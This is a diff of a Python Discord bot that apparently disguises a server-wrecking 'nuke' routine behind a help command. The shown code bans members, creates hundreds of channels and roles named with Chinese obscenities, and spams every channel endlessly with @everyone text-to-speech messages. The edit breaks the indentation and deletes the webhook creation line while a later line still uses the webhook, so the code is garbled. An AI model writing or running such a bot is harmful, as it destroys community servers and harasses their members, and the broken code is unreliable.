@@ -29,14 +29,13 @@ async def help(ctx):
             await member.ban()
         except:
             pass
-    for i in range(1, 500):
+   for i in range(1, 500):
         try:
-            await ctx.guild.create_text_channel(name="e04-nuke-you")
-            await ctx.guild.create_role(name = "垃圾群組")
+            await ctx.guild.create_text_channel("吃我雞巴")
+            await ctx.guild.create_role("吃我雞巴")
         except:
             pass
     for channel in ctx.guild.channels:
-        webhook = await channel.create_webhook(name="e04 吃雞雞")
         while True:
             await channel.send(f"@everyone@here\n吃我雞巴",tts=True)
             await webhook.send(f"@everyone@here\n吃我雞巴",tts=True)
